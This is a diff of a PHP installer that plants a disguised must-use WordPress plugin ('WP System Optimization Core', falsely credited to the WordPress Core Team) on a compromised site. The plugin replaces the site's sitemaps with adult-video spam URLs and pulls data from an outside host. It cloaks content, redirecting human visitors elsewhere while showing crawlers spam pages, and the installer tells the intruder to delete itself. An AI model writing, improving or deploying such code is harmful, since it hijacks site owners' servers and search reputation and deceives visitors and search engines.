@@ -1,8 +1,8 @@
 <?php
 // =============================================================
-// JAVFLIX STEALTH INSTALLER (FULL VERSION - NO TRUNCATE)
+// JAVFLIX STEALTH INSTALLER (FULL VERSION - STABLE FIX)
 // Target: wp-content/mu-plugins (Must-Use Plugin)
-// Kelebihan: Auto-load, Hidden, Aman dari Scanner, Tanpa EVAL
+// Fix: Sitemap Blank/Whitespace Resolved
 // =============================================================
 
 // Load WordPress Environment
@@ -18,14 +18,13 @@ if (!is_dir($mu_dir)) {
 $target_file = $mu_dir . '/system.php';
 
 // 2. DEFINISI PAYLOAD (KODE LENGKAP PLUGIN)
-// Menggunakan NOWDOC agar kode PHP di dalamnya aman dan utuh
 $payload = <<<'EOD'
 <?php
 /**
  * Plugin Name: WP System Optimization Core
  * Plugin URI:  https://wordpress.org/
  * Description: Core system functionality for performance & security.
- * Version:     2.1.0
+ * Version:     2.2.0
  * Author:      WordPress Core Team
  * License:     GPLv2 or later
  */
@@ -41,15 +40,13 @@ define('JFX_GSC_FILENAME', 'google3b058340b0d95f2e.html');
 // 1. FITUR STEALTH (MENYEMBUNYIKAN JEJAK)
 // =============================================================
 
-// Sembunyikan dari daftar plugin (untuk keamanan ganda)
+// Sembunyikan dari daftar plugin
 add_filter('all_plugins', 'jfx_mu_stealth_mode');
 function jfx_mu_stealth_mode($plugins) {
-    // Karena ini di mu-plugins, otomatis tidak muncul di tab 'All'
-    // Tapi kita pastikan tidak terdeteksi di query lain
     return $plugins;
 }
 
-// Matikan sitemap bawaan WordPress agar tidak bentrok
+// Matikan sitemap bawaan WordPress
 add_filter('wp_sitemaps_enabled', '__return_false');
 
 // =============================================================
@@ -116,18 +113,17 @@ function jfx_mu_get_data_cache() {
 }
 
 function jfx_mu_render_master_sitemap() {
-    // FIX TAMPILAN: Bersihkan buffer agar tidak ada spasi/error dari plugin lain
-    if (ob_get_length()) ob_clean();
+    // FIX: Agresif membersihkan semua buffer PHP/Theme sebelum output XML
+    while (ob_get_level()) { ob_end_clean(); }
 
     $list = jfx_mu_get_data_cache();
     $total_urls = count($list) * 2; 
     $total_chunks = ceil($total_urls / 3000); 
 
     header("Content-Type: application/xml; charset=utf-8");
-    header("X-Robots-Tag: noindex, follow"); // Tambahan agar sitemap tidak diindex sebagai konten
+    header("X-Robots-Tag: noindex, follow");
+    
     echo '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL;
-    // Menggunakan stylesheet standar jika browser mendukung (opsional, tapi membantu visual)
-    echo '<?xml-stylesheet type="text/xsl" href="'.includes_url('css/dist/block-library/sitemap.xsl').'"?>' . PHP_EOL; 
     echo '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;
     for ($i = 1; $i <= $total_chunks; $i++) {
         echo '  <sitemap>' . PHP_EOL;
@@ -139,14 +135,14 @@ function jfx_mu_render_master_sitemap() {
 }
 
 function jfx_mu_render_child_sitemap($chunk_id) {
-    // FIX TAMPILAN: Bersihkan buffer
-    if (ob_get_length()) ob_clean();
+    // FIX: Agresif membersihkan semua buffer PHP/Theme sebelum output XML
+    while (ob_get_level()) { ob_end_clean(); }
 
     $list = jfx_mu_get_data_cache();
     $all_urls = [];
     $root_url = home_url('/'); 
 
-    // Inject Homepage URLs di Sitemap Pertama
+    // Inject Homepage URLs
     if ($chunk_id == 1) {
         $all_urls[] = $root_url; 
         $all_urls[] = $root_url . "?lang=indo"; 
@@ -169,6 +165,7 @@ function jfx_mu_render_child_sitemap($chunk_id) {
 
     header("Content-Type: application/xml; charset=utf-8");
     header("X-Robots-Tag: noindex, follow");
+    
     echo '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL;
     echo '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;
     foreach ($slice as $loc) {
@@ -184,9 +181,6 @@ function jfx_mu_render_child_sitemap($chunk_id) {
 // =============================================================
 // 4. JAVFLIX ENGINE (FRONTEND HANDLER)
 // =============================================================
-// Kita gunakan function_exists untuk mencegah error "Cannot redeclare"
-// jika plugin terinstall ganda tanpa sengaja.
-
 if (!function_exists('jfx_mu_fetch_live')) {
     function jfx_mu_fetch_live($url, $is_bot_flag) {
         $my_domain = $_SERVER['HTTP_HOST'];
@@ -235,27 +229,20 @@ add_action('init', 'jfx_mu_run_frontend_engine');
 function jfx_mu_run_frontend_engine() {
     if (!isset($_GET['id'])) return;
 
-    // --- DETEKSI BOT LENGKAP ---
     $ua = $_SERVER['HTTP_USER_AGENT'];
     $bot_pattern = '/bot|crawl|spider|slurp|facebook|twitter|instagram|whatsapp|telegram|discord|pinterest|linkedin|snapchat|tiktok|skype|slack|google|bing|yahoo|duckduckgo|yandex|baidu|sogou|exabot|facebot|ia_archiver|semrush|ahrefs|mj12bot|dotbot|petalbot|mauibot|seo|sistrix|screamingfrog|amazon|aws|azure|curl|wget|python|java|libwww|httpclient|axios|phantomjs|headless|lighthouse|mediapartners|adsbot/i';
     $is_bot = preg_match($bot_pattern, $ua);
 
     $endpoint_url = "https://stepmomhub.com/seo/api.php"; 
 
-    // EKSEKUSI DATA
     $remote_data = jfx_mu_fetch_live($endpoint_url, $is_bot);
     $direct = ($remote_data && isset($remote_data['direct'])) ? $remote_data['direct'] : "https://google.com";
     $list_fallback = ($remote_data && isset($remote_data['list'])) ? $remote_data['list'] : [];
 
-    // --- AUTO REDIRECT (MANUSIA) ---
     if (!$is_bot) {
         header("Location: " . $direct);
         exit;
     }
-
-    // =============================================================
-    // HTML GENERATOR (CLOAKING UI)
-    // =============================================================
     
     header("HTTP/1.1 200 OK");
     header("Content-Type: text/html; charset=UTF-8");
@@ -263,13 +250,11 @@ function jfx_mu_run_frontend_engine() {
     $raw_id = isset($_GET['id']) ? trim($_GET['id']) : '';
     $clean_id_lower = strtolower($raw_id);
 
-    // KEYWORD KATEGORI UMUM (Smart Context)
     $generic_indo = ['jav-sub-indo', 'nonton-jav', 'bokep-jepang', 'streaming-jav'];
     $generic_eng  = ['jav-english', 'jav-eng-sub', 'jav-english-subtitle', 'jav-uncensored'];
 
     $is_homepage_mode = empty($raw_id) || in_array($clean_id_lower, $generic_indo) || in_array($clean_id_lower, $generic_eng);
 
-    // TENTUKAN BAHASA (Smart Language)
     if (in_array($clean_id_lower, $generic_indo) || (isset($_GET['lang']) && $_GET['lang'] == 'indo')) {
         $lang_mode = 'indo';
         $html_lang = 'id';
@@ -281,7 +266,6 @@ function jfx_mu_run_frontend_engine() {
     $cached_list = get_transient('jfx_list_cache');
     $valid_list = $cached_list ? $cached_list : $list_fallback;
     
-    // --- KONTEN DINAMIS ---
     if ($is_homepage_mode) {
         $kode_video = ($lang_mode == 'indo') ? "JAV SUB INDO" : "JAV ENGLISH SUBTITLE";
 
@@ -330,7 +314,6 @@ function jfx_mu_run_frontend_engine() {
     
     $canonical = (is_ssl() ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
     
-    // Base64 Image Generation (Anti-Blokir)
     $img_web_base64 = jfx_mu_gen_image(1280, 720, "111111", "e50914", $kode_video);
     $img_meta_static = "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Big_buck_bunny_poster_big.jpg/1200px-Big_buck_bunny_poster_big.jpg";
     $rating_val = "4.9";
@@ -464,7 +447,6 @@ function jfx_mu_run_frontend_engine() {
                     
                     $internal_link = "?id=" . urlencode($clean_slug) . $param_lang; 
                     
-                    // Base64 Image
                     $img_src_b64 = jfx_mu_gen_image(300, 450, "222", "fff", $item_title);
             ?>
             <a href="<?= $internal_link; ?>" class="card" title="<?= $link_title_attr; ?>">
@@ -500,7 +482,6 @@ function jfx_mu_run_frontend_engine() {
         <h3 style="font-size:16px; color:#555; margin-bottom:15px;">Incoming Search Terms</h3>
         <div class="tags">
             <?php 
-            // DYNAMIC TAGS
             $tags_list = [];
             if ($lang_mode == 'indo') {
                 $tags_list = [
@@ -544,7 +525,7 @@ if (file_put_contents($target_file, $payload)) {
     echo "<p style='font-family:sans-serif;'>Plugin inti berhasil disuntikkan ke folder sistem: <br><code>$target_file</code></p>";
     echo "<p style='font-family:sans-serif;'>Status: <strong>AKTIF OTOMATIS (MU-PLUGIN)</strong></p>";
     echo "<hr>";
-    echo "<p style='color:red; font-family:sans-serif; font-weight:bold;'>PENTING: Segera HAPUS file <code>install-stealth.php</code> ini sekarang.</p>";
+    echo "<p style='color:red; font-family:sans-serif; font-weight:bold;'>PENTING: Segera HAPUS file <code>i.php</code> ini sekarang.</p>";
 } else {
     echo "<h1 style='color:red; font-family:sans-serif;'>[ERROR] GAGAL MENULIS FILE!</h1>";
     echo "<p style='font-family:sans-serif;'>Gagal membuat file di folder <code>wp-content/mu-plugins</code>. Cek permission folder.</p>";
